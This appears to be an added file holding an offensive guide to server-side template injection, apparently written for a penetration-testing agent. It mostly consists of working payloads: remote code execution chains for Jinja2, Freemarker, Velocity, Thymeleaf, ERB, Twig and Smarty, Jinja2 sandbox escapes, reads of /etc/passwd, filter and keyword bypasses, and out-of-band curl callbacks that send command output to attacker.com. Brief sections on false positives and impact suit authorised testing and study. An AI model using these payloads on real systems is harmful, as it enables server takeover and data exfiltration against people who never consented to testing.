@@ -1,0 +1,380 @@
+<ssti_vulnerability_guide>
+<title>SERVER-SIDE TEMPLATE INJECTION (SSTI)</title>
+
+<critical>SSTI occurs when user input is embedded into server-side templates without proper sanitization, allowing attackers to inject template directives that execute on the server. This often leads to remote code execution, making SSTI a critical vulnerability class.</critical>
+
+<scope>
+- Python templates: Jinja2, Mako, Tornado, Django Templates
+- Java templates: Freemarker, Velocity, Thymeleaf, Pebble
+- PHP templates: Twig, Smarty, Blade
+- JavaScript templates: Pug (Jade), EJS, Nunjucks, Handlebars
+- Ruby templates: ERB, Slim, Haml
+- .NET templates: Razor, DotLiquid
+</scope>
+
+<methodology>
+1. Identify reflection points where user input appears in rendered output.
+2. Submit detection polyglots to identify template engine behavior.
+3. Confirm template engine type through unique syntax responses or error messages.
+4. Escalate from expression evaluation to object access and code execution.
+5. Achieve RCE by accessing runtime objects, classes, or OS command execution.
+</methodology>
+
+<detection_polyglots>
+{% raw %}
+# Universal detection - test multiple syntaxes
+${{<%[%'"}}%\.
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@(7*7)
+
+# Math-based detection
+{{7*'7'}}     # Jinja2: 7777777, Twig: 49
+${7*7}        # Freemarker, Velocity
+<%= 7*7 %>    # ERB, EJS
+#{7*7}        # Ruby interpolation
+*{7*7}        # Thymeleaf
+@(7*7)        # Razor
+
+# String-based detection
+{{''.__class__}}          # Jinja2
+${object.class}           # Freemarker
+<%= self.class %>         # ERB
+{{constructor.constructor('return this')()}}  # Handlebars/AngularJS
+{% endraw %}
+</detection_polyglots>
+
+<engine_identification>
+<jinja2>
+- Syntax: {{ }}, {% %}, {# #}
+- Confirms: {{7*'7'}} outputs 7777777
+- Errors: jinja2.exceptions.*, UndefinedError
+- Features: filters, tests, macros, extends/include
+</jinja2>
+
+<twig>
+- Syntax: {{ }}, {% %}, {# #}
+- Confirms: {{7*'7'}} outputs 49
+- Errors: Twig\Error\*, Twig_Error_*
+- Features: filters, functions, similar to Jinja2
+</twig>
+
+<freemarker>
+- Syntax: ${}, <#>, [#]
+- Confirms: ${7*7} outputs 49
+- Errors: freemarker.core.*, ParseException
+- Features: directives, built-ins, includes
+</freemarker>
+
+<velocity>
+- Syntax: $variable, #directive
+- Confirms: $class.inspect('java.lang.Runtime')
+- Errors: VelocityException, ParseErrorException
+- Features: #set, #if, #foreach
+</velocity>
+
+<thymeleaf>
+- Syntax: th:*, [[${expr}]], *{expr}
+- Confirms: __${7*7}__
+- Errors: org.thymeleaf.*, TemplateProcessingException
+- Features: Spring integration, expression utility objects
+</thymeleaf>
+
+<pebble>
+- Syntax: {{ }}, {% %}
+- Similar to Twig/Jinja2
+- Errors: PebbleException
+</pebble>
+
+<erb>
+- Syntax: <%= %>, <% %>, <%# %>
+- Confirms: <%= 7*7 %> outputs 49
+- Errors: SyntaxError, ERB::Error
+- Features: Ruby code execution
+</erb>
+
+<smarty>
+- Syntax: {$var}, {if}, {literal}
+- Confirms: {$smarty.version}
+- Errors: Smarty_Exception
+</smarty>
+
+<handlebars>
+- Syntax: {{ }}, {{# }}
+- Limited by design; test prototype pollution for RCE
+- Confirms: {{this}}
+</handlebars>
+</engine_identification>
+
+<exploitation_techniques>
+<jinja2_python>
+{% raw %}
+# Class traversal to access builtins
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__base__.__subclasses__()}}
+
+# Find useful classes (subprocess.Popen, os._wrap_close)
+{{''.__class__.__mro__[2].__subclasses__()[INDEX]}}
+
+# RCE via subprocess.Popen
+{{''.__class__.__mro__[2].__subclasses__()[POPEN_INDEX]('id',shell=True,stdout=-1).communicate()}}
+
+# RCE via os module access
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.__class__.__mro__[1].__subclasses__()[WRAP_INDEX].__init__.__globals__['popen']('id').read()}}
+
+# RCE via import
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# File read
+{{''.__class__.__mro__[2].__subclasses__()[FILE_INDEX]('/etc/passwd').read()}}
+
+# Common gadget indices vary by Python version; enumerate subclasses first
+{% endraw %}
+</jinja2_python>
+
+<twig_php>
+{% raw %}
+# Access environment
+{{_self.env}}
+{{_self.env.getLoader()}}
+
+# Deprecated method (older versions)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Filter bypass attempts
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{['cat /etc/passwd']|filter('exec')}}
+
+# Twig 3.x restrictions make RCE harder; focus on information disclosure
+{{app.request.server.all|join}}
+{% endraw %}
+</twig_php>
+
+<freemarker_java>
+{% raw %}
+# Built-in RCE
+${exec("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# Object instantiation
+<#assign ex = "freemarker.template.utility.Execute"?new()>
+${ex("id")}
+
+# ObjectConstructor
+<#assign oc = "freemarker.template.utility.ObjectConstructor"?new()>
+<#assign rt = oc("java.lang.Runtime").getRuntime()>
+${rt.exec("id")}
+
+# API method access
+${object.class.forName("java.lang.Runtime").getRuntime().exec("id")}
+{% endraw %}
+</freemarker_java>
+
+<velocity_java>
+{% raw %}
+# Class loader access
+#set($rt=$class.inspect("java.lang.Runtime").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($str=$class.inspect("java.lang.String").type)
+#set($ex=$rt.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# Simplified
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()
+{% endraw %}
+</velocity_java>
+
+<thymeleaf_java>
+{% raw %}
+# SpEL injection via preprocessing
+__${T(java.lang.Runtime).getRuntime().exec('id')}__
+
+# Expression evaluation
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# URL parameter injection (path variable)
+/path?param=__${T(java.lang.Runtime).getRuntime().exec('id')}__::x
+
+# Fragment expression
+~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__}
+{% endraw %}
+</thymeleaf_java>
+
+<erb_ruby>
+{% raw %}
+# Direct code execution
+<%= system('id') %>
+<%= `id` %>
+<%= exec('id') %>
+
+# File operations
+<%= File.read('/etc/passwd') %>
+<%= Dir.glob('**/*') %>
+
+# Object inspection
+<%= self.class.ancestors %>
+<%= ObjectSpace.each_object(Class).to_a %>
+{% endraw %}
+</erb_ruby>
+
+<smarty_php>
+{% raw %}
+# PHP code execution (if php tag enabled)
+{php}system('id');{/php}
+
+# Static class methods
+{Smarty_Internal_Write_File::writeFile('/tmp/test','pwned',self::clearConfig())}
+
+# If left delimiter changed
+{literal}<script>...</script>{/literal}
+{% endraw %}
+</smarty_php>
+</exploitation_techniques>
+
+<sandbox_escapes>
+<jinja2_sandbox>
+{% raw %}
+# Bypass sandboxed environment
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+
+# Access via request object (Flask)
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}
+{% endraw %}
+</jinja2_sandbox>
+
+<twig_sandbox>
+{% raw %}
+# Limited sandbox escapes; focus on allowed functions
+{{'/etc/passwd'|file_excerpt(1,100)}}
+{{app.request.query.all}}
+{% endraw %}
+</twig_sandbox>
+</sandbox_escapes>
+
+<blind_ssti>
+<timing_based>
+{% raw %}
+# Python/Jinja2 timing
+{{''.__class__.__mro__[2].__subclasses__()[INDEX]('sleep 5',shell=True)}}
+{{request.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['popen']('sleep 5').read()}}
+
+# Java timing
+${T(java.lang.Thread).sleep(5000)}
+${"freemarker.template.utility.Execute"?new()("sleep 5")}
+{% endraw %}
+</timing_based>
+
+<out_of_band>
+{% raw %}
+# DNS/HTTP callbacks
+{{''.__class__.__mro__[2].__subclasses__()[INDEX]('curl http://attacker.com/?x=$(id)',shell=True)}}
+${exec("curl http://attacker.com")}
+<%= system('curl http://attacker.com') %>
+{% endraw %}
+</out_of_band>
+
+<error_based>
+{% raw %}
+# Trigger errors containing sensitive data
+{{1/0}}
+{{undefined_variable}}
+${1/0}
+{% endraw %}
+</error_based>
+</blind_ssti>
+
+<bypass_techniques>
+<filter_bypass>
+{% raw %}
+# Jinja2 filter bypass - attribute access
+{{request|attr('application')}}
+{{request|attr('\x5f\x5fclass\x5f\x5f')}}
+
+# String concatenation
+{{''['__cla'+'ss__']}}
+{{'__clas'~'s__'}}
+
+# Character encoding
+{{''['\x5f\x5fclass\x5f\x5f']}}
+{%set a='__cla'%}{%set b='ss__'%}{{''[a~b]}}
+{% endraw %}
+</filter_bypass>
+
+<keyword_bypass>
+{% raw %}
+# Bypass blocked keywords using hex/unicode
+{{''["\x5f\x5fclass\x5f\x5f"]}}
+{{''["\u005f\u005fclass\u005f\u005f"]}}
+
+# Using request args (Flask)
+{{request.args.a}}?a=__class__
+
+# Using cookies/headers
+{{request.cookies.cmd}}
+{% endraw %}
+</keyword_bypass>
+
+<encoding>
+{% raw %}
+# URL encoding
+%7B%7B7*7%7D%7D
+
+# Double URL encoding
+%257B%257B7*7%257D%257D
+
+# Unicode normalization
+｛｛7*7｝｝
+{% endraw %}
+</encoding>
+</bypass_techniques>
+
+<validation>
+1. Demonstrate template expression evaluation with mathematical operations.
+2. Identify the exact template engine through unique syntax or error messages.
+3. Show progression from expression evaluation to object access.
+4. Achieve RCE or file read with verifiable output (username, file contents).
+5. Document exact payload, encoding, and injection point for reproducibility.
+</validation>
+
+<false_positives>
+- Reflected output without template processing (simple echo)
+- Client-side template rendering (AngularJS, Vue, React)
+- Template engines with proper sandboxing and no escape vectors
+- Expression evaluation limited to safe operations (math only)
+- Auto-escaping enabled with no bypass available
+</false_positives>
+
+<impact>
+- Remote code execution on the server
+- Arbitrary file read/write
+- Server-side request forgery (SSRF) via code execution
+- Data exfiltration from application memory and configuration
+- Lateral movement within the infrastructure
+- Complete server compromise
+</impact>
+
+<pro_tips>
+1. Always start with detection polyglots before attempting exploitation.
+2. Identify the exact template engine version; exploits are version-specific.
+3. Enumerate available objects and classes before attempting RCE.
+4. Use out-of-band callbacks when blind; timing attacks can be noisy.
+5. Check for sandboxed environments and research known escapes.
+6. Look for debug endpoints or error pages that may reveal template errors.
+7. Test both GET and POST parameters; injection points vary.
+8. Consider SSTI in unexpected places: email templates, PDF generators, error messages.
+9. Document the class index for Python exploits; it varies by environment.
+10. Test with and without auto-escaping; some contexts may be unescaped.
+</pro_tips>
+
+<remember>SSTI bridges the gap between input reflection and code execution. Template engines were designed for flexibility, not security, making proper input validation essential. Always treat user input as data, never as template code.</remember>
+</ssti_vulnerability_guide>
